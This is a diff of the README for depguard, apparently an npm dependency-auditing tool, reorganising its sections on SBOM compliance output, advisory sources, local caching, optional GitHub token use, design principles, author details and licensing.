+Suitable for **EU Cyber Resilience Act**, **US Executive Order 14028 / OMB M-22-18**, SOC 2, FedRAMP, and supplier procurement. PURLs follow the [Package URL spec](https://github.com/package-url/purl-spec/blob/main/PURL-TYPES.rst#npm). SHA-512 integrity hashes are extracted from `package-lock.json` and converted from base64 to hex per the CycloneDX schema. With `--include-vex`, advisories are inlined with CVSS ratings and patched versions.
 
-depguard is built and maintained by **Jorge Morais** — Tech Lead at Balanças Marques in Braga, Portugal, working on edge-to-cloud systems for industrial operations. More on what I work on at [jorgemopanc.com](https://jorgemopanc.com) and [LinkedIn](https://www.linkedin.com/in/jorge-mopanc/).
+## Data, privacy & performance
 
-If depguard saves you from installing a malicious package, catches a missed CVE, or unblocks a compliance audit, and you'd like to support the project, [GitHub Sponsors](https://github.com/sponsors/mopanc) is the cleanest way. No expectations — the tool is free and will stay so. Issues, PRs, and bug reports are equally welcome.
+- **Two advisory databases, deduplicated.** Each advisory is filtered to the installed version range (no noise from advisories that don't actually affect you) and tagged with its `source` field.
 
-## License
+  | Source | What it catches |
+  |--------|----------------|
+  | npm Registry | `npm audit` advisories |
+  | GitHub Advisory DB | GHSAs, often not in npm |
 
-Apache-2.0 — see [LICENSE](LICENSE) for details.
+- **Everything stays local.** No telemetry, no usage reporting, nothing sent anywhere. Audit results are cached in memory (5 min TTL) and on disk under `~/.depguard/cache/` (24h TTL); the cache is cleaned on startup.
+
+- **GitHub token (optional).** Set `GITHUB_TOKEN` (no scopes needed — identification only) to raise the GitHub Advisory API rate limit from 60/h to 5,000/h. If `gh` CLI or GitHub Actions already exposes one, depguard picks it up automatically.
+
+## About
+
+**Design principles.** Zero runtime dependencies. Never throws on network errors — returns degraded results with warnings. TypeScript strict. 100% offline tests. False-positive aversion is a hard constraint for every detection rule — depguard is a security tool, and a security tool with poor precision destroys its own trust.
+
+**Development.**
+
+```bash
+npm test          # 409 offline tests
+npm run check     # version + build + lint + test + audit:security (gates publish)
+```
+
+**Author.** Jorge Morais ([jorgemopanc.com](https://jorgemopanc.com) · [LinkedIn](https://www.linkedin.com/in/jorge-mopanc/)) — Tech Lead at Balanças Marques in Braga, Portugal, building edge-to-cloud systems for industrial operations. Issues, PRs, and bug reports welcome. If depguard saves you from a malicious install or unblocks a compliance audit and you'd like to support the project, [GitHub Sponsors](https://github.com/sponsors/mopanc) is the cleanest way — no expectations, the tool is free and will stay so.
+
+**License.** Apache-2.0 — see [LICENSE](LICENSE).
